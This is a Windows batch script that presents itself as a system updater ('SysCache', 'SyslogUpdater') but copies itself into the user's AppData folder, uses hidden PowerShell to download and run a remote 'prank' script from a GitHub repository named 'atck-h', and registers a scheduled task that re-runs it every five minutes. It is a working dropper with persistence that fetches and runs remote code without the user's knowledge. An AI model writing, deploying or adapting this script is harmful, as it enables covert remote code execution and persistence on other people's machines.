@echo off
setlocal enabledelayedexpansion

:: ===================================================================
:: CONFIGURATION – change these values as needed
:: ===================================================================
set "DELAY=600"                   & REM seconds before first run (600 = 10 min)
set "UPDATER_INTERVAL=5"           & REM minutes between updater runs

set "BASE=%APPDATA%\SysCache"
set "UPDATER=%BASE%\updater.cmd"
set "PRANK=%BASE%\syslog.cmd"
set "LOCAL_VER=%BASE%\local_version.txt"
set "VERSION_URL=https://raw.githubusercontent.com/maiz-an/atck-h/main/version.txt"
set "FILE_URL=https://raw.githubusercontent.com/maiz-an/atck-h/main/syslog.cmd"
set "REMOTE_VER=%TEMP%\rv.txt"
set "DOWNLOAD=%TEMP%\sn.cmd"
set "FIRSTRUN_FLAG=%BASE%\firstrun.txt"
set "LOG_FILE=%BASE%\debug.log"

if not exist "%BASE%" mkdir "%BASE%"
echo [%DATE% %TIME%] ===== Updater started ===== >> "%LOG_FILE%"

:: Copy this updater to the base folder (if not already there)
if /i not "%~f0"=="%UPDATER%" (
    copy /Y "%~f0" "%UPDATER%" >nul
    echo [%DATE% %TIME%] Updater copied to %UPDATER% >> "%LOG_FILE%"
)

:: Download remote version
powershell -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri '%VERSION_URL%' -OutFile '%REMOTE_VER%' -ErrorAction Stop } catch {}" >nul 2>&1
if not exist "%REMOTE_VER%" (
    echo [%DATE% %TIME%] WARNING: Could not download version file >> "%LOG_FILE%"
    goto RUN
)

set /p REMOTE=<"%REMOTE_VER%"
if exist "%LOCAL_VER%" ( set /p LOCAL=<"%LOCAL_VER%" ) else ( set "LOCAL=0" )

echo [%DATE% %TIME%] Local version: %LOCAL%, Remote version: %REMOTE% >> "%LOG_FILE%"

if not "%LOCAL%"=="%REMOTE%" (
    echo [%DATE% %TIME%] New version detected >> "%LOG_FILE%"
    powershell -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri '%FILE_URL%' -OutFile '%DOWNLOAD%' -ErrorAction Stop } catch {}" >nul 2>&1
    if exist "%DOWNLOAD%" (
        move /Y "%DOWNLOAD%" "%PRANK%" >nul
        echo %REMOTE% > "%LOCAL_VER%"
        echo [%DATE% %TIME%] Downloaded new prank to %PRANK% >> "%LOG_FILE%"

        :: Store target time as a simple PowerShell-readable string (YYYY-MM-DD HH:MM:SS)
        for /f "usebackq delims=" %%a in (`powershell -Command "(Get-Date).AddSeconds(%DELAY%).ToString('yyyy-MM-dd HH:mm:ss')"`) do set "TARGET=%%a"
        echo %TARGET% > "%FIRSTRUN_FLAG%"
        echo [%DATE% %TIME%] First‑run flag created with target: %TARGET% >> "%LOG_FILE%"
    ) else (
        echo [%DATE% %TIME%] ERROR: Download failed >> "%LOG_FILE%"
    )
)

:RUN
:: If this is a first run (flag exists), check whether the target time has been reached
if exist "%FIRSTRUN_FLAG%" (
    set /p TARGET=<"%FIRSTRUN_FLAG%"
    echo [%DATE% %TIME%] Flag exists, target: %TARGET% >> "%LOG_FILE%"
    :: Compare current time with target using PowerShell (with simple string format)
    powershell -Command "$target = [datetime]'%TARGET%'; if ((Get-Date) -ge $target) { exit 0 } else { exit 1 }"
    if !errorlevel! equ 0 (
        echo [%DATE% %TIME%] Target time reached. Starting prank... >> "%LOG_FILE%"
        start /b "" "%PRANK%"
        timeout /t 2 /nobreak >nul
        del "%FIRSTRUN_FLAG%"
        if not exist "%FIRSTRUN_FLAG%" (
            echo [%DATE% %TIME%] Flag deleted successfully >> "%LOG_FILE%"
        ) else (
            echo [%DATE% %TIME%] ERROR: Flag could not be deleted >> "%LOG_FILE%"
        )
    ) else (
        echo [%DATE% %TIME%] Target time not yet reached >> "%LOG_FILE%"
    )
) else (
    echo [%DATE% %TIME%] No flag present >> "%LOG_FILE%"
)

:: Create / update the scheduled task to run this updater every UPDATER_INTERVAL minutes
schtasks /create /tn "SyslogUpdater" /tr "cmd /c start /min \"\" \"%UPDATER%\"" /sc minute /mo %UPDATER_INTERVAL% /f >nul 2>&1
if !errorlevel! equ 0 (
    echo [%DATE% %TIME%] Scheduled task created/updated successfully >> "%LOG_FILE%"
) else (
    echo [%DATE% %TIME%] ERROR: Failed to create scheduled task >> "%LOG_FILE%"
)

echo [%DATE% %TIME%] ===== Updater finished ===== >> "%LOG_FILE%"
endlocal